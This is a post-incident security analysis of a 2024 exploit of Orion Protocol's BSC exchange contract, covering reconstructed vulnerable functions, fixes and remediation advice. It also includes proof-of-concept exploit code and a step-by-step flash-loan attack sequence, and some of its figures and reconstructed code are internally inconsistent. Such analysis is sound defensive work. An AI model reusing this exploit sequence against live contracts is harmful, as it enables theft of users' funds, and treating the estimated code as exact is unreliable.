# Orion Protocol (TradeOnOrion) — Atomic Swap Signature Replay + Balance Accounting Error Analysis

| Item | Details |
|------|------|
| **Date** | 2024-05-28 |
| **Protocol** | Orion Protocol (TradeOnOrion, BSC Exchange) |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$645,000 (BUSDT, ORN, XRP, BNB, and various other tokens) |
| **Attacker EOA** | [0x5117...88D2](https://bscscan.com/address/0x51177db1ff3b450007958447946a2eee388288d2) |
| **Attack Contract** | [0xF8Bf...DB6](https://bscscan.com/address/0xf8bfac82bdd7ac82d3aeec98b9e1e73579509db6) |
| **Attack Tx** | [0x6608...e18c](https://bscscan.com/tx/0x660837a1640dd9cc0561ab7ff6c85325edebfa17d8b11a3bb94457ba6dcae18c) |
| **Vulnerable Contract** | [0xe9d1...17Ca](https://bscscan.com/address/0xe9d1D2a27458378Dd6C6F0b2c390807AEd2217Ca) (proxy) |
| **Implementation Contract** | [0x3677...0ad](https://bscscan.com/address/0x3677ff2d89ea10ba5200e6bb3a37106ae33db0ad) (unverified) |
| **Attack Block** | 39,107,494 |
| **Root Cause** | `redeemAtomic()` business logic flaw — double-draining stake balance via signed orders during stake release request, then over-withdrawing |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/Tradeonorion_exp.sol) |
| **Note** | Prior incident on the same protocol on 2023-02-02 via reentrancy attack on Ethereum/BSC ($3M loss) |

---

## 1. Vulnerability Overview

Orion Protocol's BSC exchange contract (`ExchangeWithAtomic`) provides a `redeemAtomic()` function for cross-chain atomic swaps. This function validates off-chain signed orders (`RedeemOrder`) and transfers one user's internal contract balance to another user.

The vulnerability arises from the combination of two logic flaws:

1. **Missing stake lock state validation**: Even after calling `requestReleaseStake()` following `lockStake()`, a signed `RedeemOrder` can still drain the staked ORN tokens. That is, there is no state consistency between the release request and `redeemAtomic()` processing.

2. **Internal balance over-credit allowed**: After depositing funds via `depositAssetTo()`, the same balance can be repeatedly transferred through multiple `redeemAtomic()` calls. Because the contract does not validate consistency between internal accounting balances (`balances`) and actual token holdings, the internal balance can be inflated far beyond actual holdings and then over-withdrawn via `withdrawTo()`.

The attacker combined these two flaws to: repeatedly transfer the stake balance of a staked ORN account (`alice`) via `redeemAtomic()` → deposit 4,000,000 BUSDT borrowed via flash loan through `depositAssetTo()` → transfer the balance again to the attacker address via `redeemAtomic()` → withdraw an amount exceeding actual holdings via `withdrawTo()`, thereby draining the protocol.

---

## 2. Vulnerable Code Analysis

### 2.1 `redeemAtomic()` — Signature Verified but Balance Consistency Not Checked

The source code of the vulnerable contract is unverified, but its behavior can be reverse-engineered from the PoC code and interface definitions.

**Vulnerable code (estimated reconstruction):**
```solidity
// ❌ Vulnerable redeemAtomic implementation (estimated)
function redeemAtomic(
    LibAtomic.RedeemOrder calldata order,
    bytes calldata secret
) external {
    // Signature verification: confirm order.sender signed it
    require(
        recoverSigner(hashOrder(order), order.signature) == order.sender,
        "Invalid signature"
    );

    // Secret hash verification
    require(
        keccak256(secret) == order.secretHash,
        "Invalid secret"
    );

    // ❌ Core flaw 1: stake lock state not verified
    // Even after requestReleaseStake(), this function can drain stake balance
    // No check for isStakeLocked[order.sender]

    // ❌ Core flaw 2: no consistency check between actual token holdings and internal balance
    // Only checks balances[order.sender][order.asset] >= order.amount
    // But does not verify whether the same balance can be transferred multiple times

    // Internal balance transfer (no actual token movement)
    balances[order.sender][order.asset] -= order.amount;
    balances[order.claimReceiver][order.asset] += order.amount;

    emit AtomicRedeemed(order.sender, order.receiver, order.asset, order.amount);
}
```

**Fixed code:**
```solidity
// ✅ Fixed redeemAtomic implementation
function redeemAtomic(
    LibAtomic.RedeemOrder calldata order,
    bytes calldata secret
) external {
    // Retain signature verification
    require(
        recoverSigner(hashOrder(order), order.signature) == order.sender,
        "Invalid signature"
    );
    require(
        keccak256(secret) == order.secretHash,
        "Invalid secret"
    );

    // ✅ Fix 1: block atomic swap while stake release is in progress
    require(
        !releaseStakeRequested[order.sender],
        "Stake release in progress"
    );

    // ✅ Fix 2: mark order hash as consumed (prevent replay)
    bytes32 orderHash = hashOrder(order);
    require(!usedOrderHashes[orderHash], "Order already redeemed");
    usedOrderHashes[orderHash] = true;

    // ✅ Fix 3: re-verify balance sufficiency (validate actual balance including stake)
    int192 availableBalance = balances[order.sender][order.asset];
    if (order.asset == orionToken) {
        availableBalance -= int192(uint192(stakes[order.sender]));
    }
    require(availableBalance >= int192(uint192(order.amount)), "Insufficient balance");

    balances[order.sender][order.asset] -= int192(uint192(order.amount));
    balances[order.claimReceiver][order.asset] += int192(uint192(order.amount));

    emit AtomicRedeemed(order.sender, order.receiver, order.asset, order.amount);
}
```

**Issue**: `redeemAtomic()` only verifies the off-chain signature and does not cross-validate on-chain state (whether a `requestReleaseStake` is in progress, whether the balance has already been drained). As a result, transferring the same balance through multiple `redeemAtomic()` calls causes the internal balance to go negative or enter an over-credited state.

---

### 2.2 `lockStake()` + `requestReleaseStake()` — Stake State Machine Flaw

**Vulnerable code (estimated reconstruction):**
```solidity
// ❌ Vulnerable stake state management
function lockStake(uint64 amount) external {
    // Move from internal balance to stake
    require(balances[msg.sender][orionToken] >= int192(amount), "Insufficient balance");
    balances[msg.sender][orionToken] -= int192(amount);
    stakes[msg.sender] += amount;
}

function requestReleaseStake() external {
    // ❌ Only records the release request, immediately restores stake to balance
    // redeemAtomic() does not reference this state, allowing attacker to exploit both
    stakes[msg.sender] = 0;
    balances[msg.sender][orionToken] += int192(uint192(currentStake));
}
```

**Fixed code:**
```solidity
// ✅ Fixed stake state machine
enum StakeState { NONE, LOCKED, RELEASE_REQUESTED }
mapping(address => StakeState) public stakeState;

function lockStake(uint64 amount) external {
    require(stakeState[msg.sender] == StakeState.NONE, "Already staked");
    require(balances[msg.sender][orionToken] >= int192(amount), "Insufficient");
    balances[msg.sender][orionToken] -= int192(amount);
    stakes[msg.sender] += amount;
    stakeState[msg.sender] = StakeState.LOCKED;
}

function requestReleaseStake() external {
    require(stakeState[msg.sender] == StakeState.LOCKED, "Not locked");
    stakeState[msg.sender] = StakeState.RELEASE_REQUESTED;
    // ✅ Does not immediately restore balance — only transitions to pending state
    // redeemAtomic() is blocked in RELEASE_REQUESTED state
}

function finalizeReleaseStake() external {
    require(stakeState[msg.sender] == StakeState.RELEASE_REQUESTED, "Not requested");
    require(block.timestamp >= releaseTime[msg.sender], "Timelock active");
    uint192 amount = stakes[msg.sender];
    stakes[msg.sender] = 0;
    stakeState[msg.sender] = StakeState.NONE;
    balances[msg.sender][orionToken] += int192(amount);
}
```

---

### 2.3 `withdrawTo()` — Withdrawal Based on Internal Balance Without Verifying Actual Holdings

**Vulnerable code (estimated reconstruction):**
```solidity
// ❌ Vulnerable withdrawTo — only checks internal balance, does not verify actual holdings
function withdrawTo(address assetAddress, uint112 amount, address to) external {
    require(
        balances[msg.sender][assetAddress] >= int192(amount),
        "Insufficient balance"
    );
    balances[msg.sender][assetAddress] -= int192(amount);

    // ❌ No check that actual contract holdings > withdrawal amount
    if (assetAddress == address(0)) {
        payable(to).transfer(amount);
    } else {
        IERC20(assetAddress).transfer(to, amount);
    }
}
```

**Fixed code:**
```solidity
// ✅ Fixed withdrawTo — cross-validates actual holdings
function withdrawTo(address assetAddress, uint112 amount, address to) external {
    require(
        balances[msg.sender][assetAddress] >= int192(amount),
        "Insufficient internal balance"
    );

    // ✅ Pre-check actual holdings
    uint256 contractBalance = assetAddress == address(0)
        ? address(this).balance
        : IERC20(assetAddress).balanceOf(address(this));
    require(contractBalance >= amount, "Insufficient contract balance");

    balances[msg.sender][assetAddress] -= int192(amount);

    if (assetAddress == address(0)) {
        payable(to).transfer(amount);
    } else {
        IERC20(assetAddress).safeTransfer(to, amount);
    }
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

The attacker creates an intermediary address called `alice`, deposits funds into the protocol, and stakes them. This is necessary because `redeemAtomic()` transfers internal balances between on-chain addresses, requiring signed orders between the attacker and a separate address.

### 3.2 Execution Phase (Sequence)

```
[Setup] Create alice account and set up initial funds
  ├─ deal(ORN, alice, 10,000,000)
  ├─ deal(BUSDT, alice, 1 ether)
  └─ deal(WBNB, alice, 0.005 ether)

[Step 1] alice → VulnContract: depositAssetTo(BUSDT, 1e18, alice)
  └─ alice's internal BUSDT balance: +1 BUSDT

[Step 2] alice → VulnContract: depositAssetTo(ORN, 10,000,000, alice)
          VulnContract: lockStake(10,000,000)
  └─ alice's ORN stake: 10,000,000

[Step 3] alice → VulnContract: redeemAtomic(order_1)  ← signed order
  └─ alice.stakes → attacker.balances[ORN]: +10,000,000 transferred
     ⚠️ Balance is credited more than actual holdings

[Step 4] alice → VulnContract: requestReleaseStake()
  └─ alice.stakes released → alice.balances[ORN] restored
     ⚠️ Same balance was already transferred in Step 3, creating double-counting in accounting

[Step 5] alice → VulnContract: redeemAtomic(order_2)  ← same balance reused
  └─ alice.balances[ORN] → attacker.balances[ORN]: re-transferred

[Steps 6–8] Repeat the pattern above (deposit additional 20,000,000 ORN + lockStake + 2x redeemAtomic)
  └─ Attacker's internal ORN balance is inflated far beyond actual holdings

[Step 9] Execute flash loan
  └─ PancakeSwap V3 Pool.flash(this, 4,000,000 ether BUSDT, 0, "0x123")
```

```
[Inside pancakeV3FlashCallback]

[Step 10] this → VulnContract: depositAssetTo(BUSDT, 4,000,000 ether, attacker)
  └─ attacker internal BUSDT balance: +4,000,000 BUSDT

[Step 11] VulnContract: redeemAtomic(attackorder)
  └─ attacker.balances[ORN] 196,375 ORN → alice.balances[ORN] transferred
     (positioning alice's balance as ORN withdrawal limit for attacker)

[Step 12] VulnContract: redeemAtomic(attackorder_2)
  └─ alice.balances[BUSDT] 401,984 BUSDT → this.balances[BUSDT] transferred
     (moving inflated BUSDT balance to final withdrawer (this))

[Step 13] VulnContract: withdrawTo(BUSDT, 4,019,844 ether, this)
  └─ ⚠️ Internal balance: 4,019,844 BUSDT (4,000,000 actual deposit + 19,844 illegitimate credit)
     Actual withdrawal: 4,019,844 BUSDT → attack contract

[Step 14] VulnContract: redeemAtomic(attackorder_3) + withdrawTo(ORN)
  └─ alice.balances[ORN] 49,892 ORN → this → withdrawn

[Step 15] VulnContract: redeemAtomic(attackorder_4) + withdrawTo(BNB)
  └─ alice.balances[BNB] 79.9 BNB → this → withdrawn

[Step 16] VulnContract: redeemAtomic(attackorder_5) + withdrawTo(XRP)
  └─ alice.balances[XRP] 62,444 XRP → this → withdrawn

[Step 17] Repay flash loan
  └─ BUSDT.transfer(msg.sender, 4,002,000 ether)  ← repayment including fee
```

### 3.3 Attack Flow Diagram

```
┌─────────────────────────────────────────────────────┐
│                    Attacker (EOA)                   │
│  0x5117...88D2                                      │
└─────────────────────────┬───────────────────────────┘
                          │ deploy
                          ▼
┌─────────────────────────────────────────────────────┐
│              Attack Contract (Test Contract)        │
│  0xF8Bf...DB6                                       │
│                                                     │
│  attack() function:                                 │
│  1. Create alice account (vm.makeAddrAndKey)        │
│  2. Fund alice with ORN/BUSDT                       │
│  3. alice deposits funds + stakes in VulnContract   │
│  4. alice → attacker signed orders via redeemAtomic x4 │
│  5. Trigger Pool.flash()                            │
└─────────────────────────┬───────────────────────────┘
                          │ flash(4,000,000 BUSDT)
                          ▼
┌─────────────────────────────────────────────────────┐
│           PancakeSwap V3 Pool                       │
│  0x3669...5000                                      │
│                                                     │
│  Provides 4,000,000 BUSDT flash loan                │
│  → calls pancakeV3FlashCallback()                   │
└─────────────────────────┬───────────────────────────┘
                          │ callback
                          ▼
┌─────────────────────────────────────────────────────┐
│  pancakeV3FlashCallback execution:                  │
│                                                     │
│  ① depositAssetTo(BUSDT, 4M, attacker)              │
│     └─ Deposit borrowed 4M BUSDT into attacker      │
│        internal balance                             │
│                                                     │
│  ② redeemAtomic x5 (various assets)                │
│     └─ Cross-transfer internal balances between     │
│        alice/attacker                               │
│        (exploiting balances inflated in setup phase)│
│                                                     │
│  ③ withdrawTo(BUSDT, ~4.02M, this)                 │
│     └─ ⚠️ Withdraws ~19,844 BUSDT beyond actual    │
│        holdings                                     │
│                                                     │
│  ④ withdrawTo(ORN / BNB / XRP)                     │
│     └─ Fully drains alice account balances          │
│                                                     │
│  ⑤ BUSDT.transfer(pool, 4,002,000)  ← repayment    │
└─────────────────────────┬───────────────────────────┘
                          │ profit secured
                          ▼
┌─────────────────────────────────────────────────────┐
│                    Final Profit                     │
│                                                     │
│  BUSDT:  ~17,844 BUSDT (net profit from over-withdrawal) │
│  ORN:    498,921 ORN   (~$13,202)                   │
│  XRP:    62,444 XRP    (~$84,172)                   │
│  BNB:    79.9 BNB      (~$48,443)                   │
│  Other:  LINK, BTCB, ETH, and additional tokens    │
│                                                     │
│  Total Loss: ~$645,000                              │
└─────────────────────────────────────────────────────┘
```

### 3.4 Outcome

- **Attacker profit**: ~$645,000 worth of multiple tokens (BUSDT, ORN, XRP, BNB, LINK, BTCB, ETH, DOGE, EGLD, etc.)
- **Protocol loss**: Multi-token loss across the exchange's internal asset pools

---

## 4. Key PoC Code Excerpts (DeFiHackLabs)

```solidity
// [Phase 1] Setup: inject funds into alice account, stake, then double-drain balance via signed orders
vm.startPrank(alice);

// alice deposits BUSDT + ORN into VulnContract
BUSDT.approve(address(vulnContract), type(uint192).max);
vulnContract.depositAssetTo(address(BUSDT), 1 ether, address(alice));

ORN.approve(address(vulnContract), type(uint192).max);
vulnContract.depositAssetTo(address(ORN), 10_000_000, address(alice));
vulnContract.lockStake(10_000_000);  // Stake ORN

// [Core exploit 1] Transfer stake balance via redeemAtomic
// order_1: alice(sender) → attacker(claimReceiver), ORN 10,000,000
vulnContract.redeemAtomic(order_1, hash_1);

// [Core exploit 2] Release request → same balance restored to alice.balances
vulnContract.requestReleaseStake();

// [Core exploit 3] Transfer restored balance again via redeemAtomic (double drain)
vulnContract.redeemAtomic(order_2, hash_2);  // Re-transfer same ORN

// Repeat the above pattern 2 more times (additional 20,000,000 ORN)...
vm.stopPrank();

// [Phase 2] Actual asset withdrawal via flash loan
// Flash loan 4,000,000 BUSDT from PancakeSwap V3 → execute withdrawal in callback
Pool.flash(address(this), 4_000_000 ether, 0, "0x123");
```

```solidity
// [pancakeV3FlashCallback] Core withdrawal logic
function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
    // Deposit borrowed BUSDT into attacker internal balance
    BUSDT.approve(address(vulnContract), type(uint256).max);
    vulnContract.depositAssetTo(address(BUSDT), 4_000_000 ether, address(attacker));

    // Reposition internal balances via signed orders (multiple assets)
    vulnContract.redeemAtomic(attackorder, Attackhash);    // Reposition ORN
    vulnContract.redeemAtomic(attackorder_2, Attackhash_2); // Reposition BUSDT

    // ⚠️ Withdraw amount exceeding actual holdings (core loss event)
    vulnContract.withdrawTo(address(BUSDT), 4_019_844_686_077_960_000_000_000, address(this));

    // Additional withdrawals of XRP, BNB, ORN
    vulnContract.redeemAtomic(attackorder_3, Attackhash_3);
    vulnContract.withdrawTo(address(ORN), 49_892_192_920_826, address(this));

    vulnContract.redeemAtomic(attackorder_4, Attackhash_4);
    vulnContract.withdrawTo(address(0), 79_896_159_740_000_000_000, address(this)); // BNB

    vulnContract.redeemAtomic(attackorder_5, Attackhash_6);
    vulnContract.withdrawTo(address(XRP), 62_444_730_331_000_000_000_000, address(this));

    // Repay flash loan (including fee)
    BUSDT.transfer(msg.sender, 4_002_000 ether);
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | State inconsistency between stake lock state and atomic swap | CRITICAL | CWE-841 |
| V-02 | `redeemAtomic()` allows internal balance double-drain | CRITICAL | CWE-682 |
| V-03 | `withdrawTo()` does not verify actual holdings vs internal balance | HIGH | CWE-20 |
| V-04 | Insufficient replay prevention for off-chain signed orders | HIGH | CWE-294 |

### V-01: State Inconsistency Between Stake Lock State and Atomic Swap (CWE-841)
- **Description**: Even while a stake release is in progress via `requestReleaseStake()`, `redeemAtomic()` can still transfer stake-related balances. The two functions target the same balance but do not reference each other's state, breaking the state machine.
- **Impact**: The same ORN stake can be transferred via `redeemAtomic()` and then restored via `requestReleaseStake()`, repeating this cycle to inflate the attacker's internal ORN balance to several times the actual holdings.
- **Attack Condition**: Possession of signed orders allowing execution of `redeemAtomic()` after `lockStake()`, then again after `requestReleaseStake()`.

### V-02: `redeemAtomic()` Allows Internal Balance Double-Drain (CWE-682)
- **Description**: When the contract's internal balance (`balances` mapping) is transferred repeatedly through multiple `redeemAtomic()` calls, no consistency check is performed against actual token holdings. By repeating the cycle of balance deduction followed by replenishment via `requestReleaseStake()`, the internal balance is inflated beyond actual holdings.
- **Impact**: `withdrawTo()`, which operates solely on internal balances, can withdraw amounts exceeding actual holdings, stealing other users' funds from the protocol.
- **Attack Condition**: Holding a valid balance in the contract + ability to generate signed orders (including self-signed).

### V-03: `withdrawTo()` Does Not Verify Actual Holdings vs Internal Balance (CWE-20)
- **Description**: `withdrawTo()` only checks the internal `balances` mapping value without comparing against `IERC20.balanceOf(address(this))`. When the internal balance is inflated, tokens that are not actually in the contract can be withdrawn.
- **Impact**: Other users' deposits in the protocol are effectively stolen.
- **Attack Condition**: Internal balance exceeding actual holdings due to V-01 or V-02.

### V-04: Insufficient Replay Prevention for Off-Chain Signed Orders (CWE-294)
- **Description**: The signature of the `RedeemOrder` passed to `redeemAtomic()` is not tracked on-chain to detect reuse with the same `secretHash`. While the PoC uses different secrets (`"test"`, `"test_1"`, `"test_2"`, etc.), the structural problem is that the same signer can generate any number of new valid orders.
- **Impact**: Since the entire order flow relies on off-chain systems, if a broker key is compromised or a malicious broker exists, unlimited withdrawals are possible.
- **Attack Condition**: Possession of the private key for the `order.sender` account (in the PoC, the attacker directly holds `alice`'s key).

---

## 6. Remediation Recommendations

### Immediate Actions

**1) Add stake state check:**
```solidity
// Add at the beginning of redeemAtomic()
require(
    !releaseStakeRequested[order.sender],
    "Cannot redeem while release stake is pending"
);
```

**2) Mark order hash as consumed:**
```solidity
mapping(bytes32 => bool) public usedAtomicOrders;

function redeemAtomic(...) external {
    bytes32 orderHash = keccak256(abi.encodePacked(
        order.sender, order.receiver, order.asset,
        order.amount, order.expiration, order.secretHash
    ));
    require(!usedAtomicOrders[orderHash], "Order already executed");
    usedAtomicOrders[orderHash] = true;
    // ...
}
```

**3) Cross-validate actual holdings in `withdrawTo()`:**
```solidity
function withdrawTo(address assetAddress, uint112 amount, address to) external {
    require(balances[msg.sender][assetAddress] >= int192(amount), "Insufficient balance");

    // Add actual contract holdings check
    if (assetAddress != address(0)) {
        require(
            IERC20(assetAddress).balanceOf(address(this)) >= amount,
            "Contract balance insufficient"
        );
    } else {
        require(address(this).balance >= amount, "Insufficient ETH");
    }

    balances[msg.sender][assetAddress] -= int192(amount);
    // Subsequent actual transfer logic...
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: State inconsistency | Manage stake state with an enum (`enum StakeState`), explicitly codify state transition rules |
| V-02: Internal balance over-credit | Invariant check on withdrawal — `sum(balances[user][token]) <= token.balanceOf(address(this))` |
| V-03: Holdings not verified | Mandate actual balance pre-check in all withdrawal functions (follow CEI pattern) |
| V-04: Signature replay | Adopt EIP-712 standard, use structured signatures including `nonce` + `deadline` + `chainId` |
| General | Separate signing authority against broker key compromise; introduce daily withdrawal limits |
| General | Apply emergency pause functionality and timelock on withdrawals |

---

## 7. Lessons Learned

1. **Always validate the invariant between internal accounting and actual holdings**: The sum of the `balances` mapping must never exceed the actual contract token holdings under any circumstances. This invariant should be checked in all deposit/withdrawal functions, or a periodic on-chain invariant verification system should be established.

2. **Design state machines explicitly and maintain consistency across cross-function calls**: When multiple functions like `lockStake → requestReleaseStake → redeemAtomic` depend on the same state, use the state machine pattern (enum + require) to prevent illegal transitions.

3. **Off-chain signature-based systems require on-chain replay prevention mechanisms**: Signature verification alone is insufficient. Used order hashes must be recorded on-chain, and nonce/deadline/chainId must be included to eliminate replay attack vectors (see EIP-712).

4. **Be vigilant against repeated attacks on the same protocol**: Orion Protocol was also attacked via reentrancy in February 2023 ($3M loss). If the entire codebase had been re-audited after the first attack and related patterns (signatures, balance accounting, atomic swap logic) had been comprehensively reviewed, this attack could have been prevented. Post-incident patches must re-examine the entire architecture, not just the vulnerable function.

5. **Flash loans are merely an amplifier**: In this attack, the flash loan was just a tool. Without the core vulnerabilities (state inconsistency + accounting error), the flash loan could not have been weaponized. Maintaining accounting invariants is a more fundamental defense than flash loan protection.

6. **Clarify the broker trust model when implementing atomic swaps**: The fact that the PoC simulates the attacker directly holding `alice`'s private key suggests that in a real attack, broker key compromise or insider attack is plausible. Broker authority should be minimized and signing authority distributed via multisig.

---

## 8. On-Chain Verification

### 8.1 Transaction Basic Information

| Item | Value |
|------|-----|
| Tx Hash | `0x660837a1640dd9cc0561ab7ff6c85325edebfa17d8b11a3bb94457ba6dcae18c` |
| Attacker (from) | `0x51177DB1Ff3b450007958447946A2EEe388288D2` |
| Attack Contract (to) | `0xF8BfaC82BdD7aC82D3AEEC98B9E1e73579509DB6` |
| Block Number | 39,107,494 |
| Attack Date | 2024-05-28 04:25:10 UTC |
| Gas Used | 6,609,636 / 7,075,202 (93.42%) |
| Gas Fee | 0.026438544 BNB (~$16) |

### 8.2 PoC vs On-Chain Amount Comparison

| Asset | PoC Withdrawal Amount | On-Chain Confirmed Amount | Status |
|------|--------------|----------------|------|
| BUSDT | ~4,019,844 BUSDT (net profit after repayment is separate) | 4,000,000 BUSDT movement confirmed | Match (difference after flash loan repayment is net profit) |
| ORN | 498,921.93 ORN | 498,921.93 ORN (~$13,202) | ✓ Match |
| XRP | 62,444.73 XRP | 62,444.73 XRP (~$84,172) | ✓ Match |
| BNB | ~79.9 BNB | 79.89615974 BNB (~$48,443) | ✓ Match |
| Total Loss | ~$645,000 | ~$645,000 per BscScan | ✓ Match |

### 8.3 Vulnerable Contract Structure

| Item | Address |
|------|------|
| Proxy (vulnerable contract) | `0xe9d1D2a27458378Dd6C6F0b2c390807AEd2217Ca` |
| Implementation | `0x3677ff2d89ea10ba5200e6bb3a37106ae33db0ad` |
| Implementation Source | Unverified (unverified bytecode) |
| Proxy Pattern | AdminUpgradeabilityProxy (EIP-1967) |

### 8.4 On-Chain Verification Limitations

The source code of the vulnerable implementation contract (`0x3677...0ad`) is not verified on BscScan, making it impossible to directly examine the actual `redeemAtomic()` and `lockStake()` implementations. The vulnerable code analysis in this document is reverse-engineered from the PoC interface definitions and observed on-chain behavior.

---

## References

- [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/Tradeonorion_exp.sol)
- [Attack Transaction (BscScan)](https://bscscan.com/tx/0x660837a1640dd9cc0561ab7ff6c85325edebfa17d8b11a3bb94457ba6dcae18c)
- [Attacker Address (BscScan)](https://bscscan.com/address/0x51177db1ff3b450007958447946a2eee388288d2)
- [Vulnerable Contract (BscScan)](https://bscscan.com/address/0xe9d1D2a27458378Dd6C6F0b2c390807AEd2217Ca)
- [MetaSec Initial Report (X)](https://x.com/MetaSec_xyz/status/1796008961302258001)
- [2023 Orion Protocol Reentrancy Attack Analysis (SlowMist)](https://slowmist.medium.com/an-analysis-of-the-attack-on-orion-protocol-c7aef70aff83)
- Related patterns: `10_signature_replay.md`, `11_logic_error.md`, `16_accounting_sync.md`